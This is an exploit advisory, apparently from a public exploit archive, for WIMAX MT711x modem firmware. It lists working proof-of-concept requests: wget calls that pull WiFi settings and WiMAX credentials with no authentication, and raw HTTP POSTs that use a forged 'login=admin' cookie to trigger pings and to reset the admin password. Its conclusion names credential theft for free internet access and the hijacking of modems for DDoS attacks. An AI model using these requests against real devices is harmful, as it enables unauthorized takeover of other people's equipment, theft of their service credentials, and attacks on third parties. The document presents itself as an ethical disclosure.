@@ -1,0 +1,69 @@
+### Exploit Title: WIMAX MT711x - Multiple Vulnerabilities
+### Date: ˝Friday, ˝December ˝11, ˝2015
+### Exploit/Vulnerability Author: Alireza Azimzadeh Milani (alimp5)
+### Vendor Homepage: http://www.seowonintech.co.kr/en/
+### Version: V_3_11_14_9_CPE
+### Tested on: Kali-Linux
+
+I'm an ethical penetration tester and super moderator of Iran Security Team(http://irsecteam.org)
+I have updated the modem to latest firmware which released by the company.
+but with this work(upgrading the firmware); The attacker can bypass the authentication mechanism.  
+
+### Details of MT711x model:
+Version Information:
+Build Time 	 2014.08.18-11:49
+CPE Ver 	 1.0.9
+MTK FW Ver 	 EX_REL_MT711x_V_3_11_14_9_CPE
+Serial Number 	 IRMB1351C9200-0001044
+
+I used below tools to find the vulnerabilities:
+1)BurpSuite - Free Edition     2)wget      3)Nmap
+
+
+### POCs of the modem:
+#Get the WIFI settings>>
+wget -c "http://server/cgi-bin/multi_wifi.cgi"
+
+#Get Wimax credentials>>
+wget -c "http://server/cgi-bin/wccm_wimax_setting.cgi"
+
+#Enable and Disable connections to modem (as default those are ENABLED)>>
+http://server/cgi-bin/remote.cgi
+
+
+#Ping a system (useful for launching (D)DOS attack)>>
+POST /cgi-bin/diagnostic.cgi HTTP/1.1
+Host: server
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://server/cgi-bin/diagnostic.cgi
+Cookie: login=; login=admin
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 158
+select_mode_ping=on&ping_ipaddr=4.2.2.4&ping_count=10&trace_ipaddr=&trace_max_ttl=6&trace_qoeries_num=3&trace_report_only_hidden=0&action=Apply&html_view=ping
+
+#Change the password of ADMIN account:
+POST /cgi-bin/pw.cgi HTTP/1.1
+Host: server
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://server/cgi-bin/pw.cgi
+Cookie: login=admin
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+isp_name=mobinnet&pw_set_select=admin&passPass=admin&passCfirm=admin&action=Apply
+
+
+### Conclusion: 
+1)the attacker can read sensitive information and set it on his own modem. such: for using free internet.
+2)Anyone who can send a packet to the modem for crashing/downgrading/DOS.
+3)To obtain the control of similar modem(MT711x) in order to launching DOS or DDOS attacks on targets in WWW(world wide web).  
+
+
+At the end, I am thankful and I wait for your response.
